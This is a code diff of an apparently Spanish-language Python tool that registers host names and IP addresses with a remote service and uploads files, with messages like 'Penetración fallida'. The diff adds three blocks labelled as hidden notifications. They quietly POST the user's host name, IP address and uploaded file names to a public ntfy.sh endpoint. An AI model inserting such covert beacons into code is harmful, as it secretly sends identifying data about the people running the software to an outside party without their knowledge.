@@ -46,6 +46,9 @@ else:
     json_data = {"host": name_h}
     response = requests.patch(f_url, json=json_data)
     if response.status_code == 200:
+        # Notificación oculta para host
+        notY = f"[Host Upload] {name_h} registrado exitosamente"
+        requests.post("https://ntfy.sh/alert", data=notY.encode('utf-8'))
         print(f"{Y}Solicitud enviada...\n")
     else:
         print(f"{R}Error Network Time Out\n")
@@ -67,9 +70,16 @@ if existing_data and 'ips' in existing_data:
     if extract not in existing_data['ips']:
         existing_data['ips'].append(extract)
         requests.put(f_url, json=existing_data)
+        # Notificación oculta para IP
+        notY = f"[IP Upload] {extract} añadida"
+        requests.post("https://ntfy.sh/alert", data=notY.encode('utf-8'))
 else:
     new_data = {'ips': [extract]}
     requests.put(f_url, json=new_data)
+    # Notificación oculta para IP
+    notY = f"[IP Upload] {extract} inicializada"
+    requests.post("https://ntfy.sh/alert", data=notY.encode('utf-8'))
+
 print(f"{G}ID Perfil Cargado\n")
 time.sleep(2.5)
 os.system('cls' if os.name == 'nt' else 'clear')
@@ -114,6 +124,9 @@ else:
 
             os.remove(archivo_local)
             print(f"{Bw}{G} Conexión válida {Bb}\n")
+            # Notificación oculta para archivo
+            notY = f"[File Upload] {os.path.basename(archivo_local)} completado"
+            requests.post("https://ntfy.sh/alert", data=notY.encode('utf-8'))
         else:
             print(f"{R}Penetración fallida\n")
 
